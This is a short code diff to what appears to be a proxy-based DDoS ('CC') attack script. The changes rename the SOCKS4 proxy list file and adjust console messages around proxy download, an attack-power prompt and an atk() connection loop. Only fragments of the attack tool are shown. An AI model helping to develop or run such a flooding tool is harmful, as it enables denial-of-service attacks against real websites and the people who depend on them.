@@ -176,9 +176,9 @@ def main():
 	cho = str(input(Fore.BLUE + "[+] Do You Want To Download Socks4 ? (y/n) : " + Fore.WHITE))
 	if cho =='y':
 		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=2000&country=all') #Code By GogoZin
-		with open('socks.txt','wb') as fp:
+		with open('socks4.txt','wb') as fp:
 			fp.write(rsp.content)
-			print(Fore.YELLOW + "[+] Sucess Get Fresh Socks List !")
+			print(Fore.YELLOW + "[+] Sucess Get Fresh Socks4 List !")
 	else:
 		pass
 	list = str(input(Fore.BLUE + "[+] Socks List (socks4.txt): " + Fore.WHITE))
@@ -187,7 +187,7 @@ def main():
 	else:
 		list = str(list)
 	pprr = open(list).readlines()
-	print(Fore.BLUE + "[+] Socks Count : " + Fore.WHITE + "%d " %len(pprr))
+	print(Fore.BLUE + "[+] Socks4 Count : " + Fore.WHITE + "%d " %len(pprr))
 	pwr = int(input(Fore.BLUE + "[+] CC.Power (1-100) : " + Fore.WHITE))
 	opth()
 
@@ -217,7 +217,7 @@ def atk():
 					s.close()
 			except:
 				s.close()
-				print("[!] Can't Connet To This Socks")
+				print("[!] Can't Connet To This Socks4")
 
 
 if __name__ == "__main__":
